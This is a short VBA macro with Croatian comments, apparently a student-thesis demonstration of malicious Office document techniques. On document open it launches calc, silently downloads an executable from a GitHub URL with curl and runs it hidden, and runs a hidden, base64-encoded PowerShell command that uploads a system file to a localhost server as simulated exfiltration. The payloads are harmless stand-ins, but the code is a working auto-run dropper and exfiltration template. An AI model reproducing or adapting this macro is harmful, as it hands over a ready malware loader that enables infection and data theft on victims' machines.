Sub Document_Open()

'pokretanje lokalnog binarya za primjer korištenja LOLBINa
    Dim objShell As Object
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run "calc"
    
'preuzimanje i pokretanje remote datoteke za primjer stageava u malwareima
    Shell "cmd /c curl -L ""https://github.com/acpwinters/Zavrsni_Rad/raw/main/calc.exe"" --output p.exe && start p.exe", vbHide

'upload calc.exe na localhost za primjer exfiltracije podataka
'powershell.exe -nop -w hidden -enc "YwB1AHIAbAAuAGUAeABlACAALQBYACAAUABPAFMAVAAgAC0ARgAgACIAZgBpAGwAZQA9AEAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAeQBzAHQAZQBtADMAMgBcAGMAYQBsAGMALgBlAHgAZQAiACAAaAB0AHQAcAA6AC8ALwAxADIANwAuAD
'AALgAwAC4AMQA6ADgAMAAwADAA ""
'$cmd = "curl.exe -X POST -F ""file=@C:\Windows\System32\calc.exe"" http://127.0.0.1:8000"
'$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
'$encoded = [Convert]::ToBase64String($bytes)
'$encoded

    Dim Str As String
    Str = Str & "powershell.exe -nop -w hidden -e ""Y3VybC5leGUgLVggUE9TVCBcIC1GICJma"
    Str = Str & "WxlPUBDOlxXaW5kb3dzXFN5c3RlbTMyXGNhbGMuZXhlIiBodHRwOi8vMTI3LjAuMC4xOjgwMDA="""
    CreateObject("Wscript.Shell").Run Str, 0

End Sub
